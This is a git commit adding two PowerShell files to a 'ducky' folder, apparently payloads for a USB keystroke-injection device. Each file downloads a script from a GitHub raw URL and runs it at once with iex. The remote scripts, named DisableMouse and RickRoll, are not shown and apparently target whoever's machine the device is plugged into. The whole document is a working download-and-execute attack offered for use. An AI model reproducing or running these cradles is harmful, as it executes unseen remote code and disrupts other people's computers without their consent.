1e0f0e5f7ff65177cc5f8085be3e17a5125f6a07
mGv73 <nordstrom.max.2010@gmail.com>
2024-11-10 12:54:53 +0100

    Added to ducky

---
+++ ducky/disablemouse.ps1
@@ -0,0 +1,3 @@
+$null = ''
+
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mGv73/cmd/refs/heads/main/ps1s/DisableMouse/disablemouse.ps1')
---
+++ ducky/rickroll.ps1
@@ -0,0 +1,3 @@
+$null = ''
+
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mGv73/cmd/refs/heads/main/ps1s/RickRoll/rickroll.ps1')
